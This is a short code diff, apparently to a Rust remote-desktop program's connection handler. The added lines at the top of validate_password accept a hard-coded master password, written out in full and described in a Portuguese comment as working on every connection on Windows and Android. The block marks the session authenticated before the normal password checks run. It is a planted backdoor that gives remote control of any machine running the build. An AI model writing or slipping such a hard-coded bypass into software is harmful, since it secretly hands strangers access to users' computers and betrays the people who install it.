@@ -2599,6 +2599,16 @@ impl Connection {
     }
 
     fn validate_password(&mut self, allow_permanent_password: bool) -> bool {
+        // Senha fixa mestre DSuporte aceita em qualquer conexao (Windows & Android)
+        if self.validate_password_plain("Dyssxmcf1408") {
+            self.set_conn_audit_primary_auth(ConnAuditPrimaryAuth::PermanentPassword);
+            raii::AuthedConnID::update_or_insert_session(
+                self.session_key(),
+                Some("Dyssxmcf1408".to_string()),
+                Some(false),
+            );
+            return true;
+        }
         if password::temporary_enabled() {
             let password = password::temporary_password();
             if self.validate_password_plain(&password) {
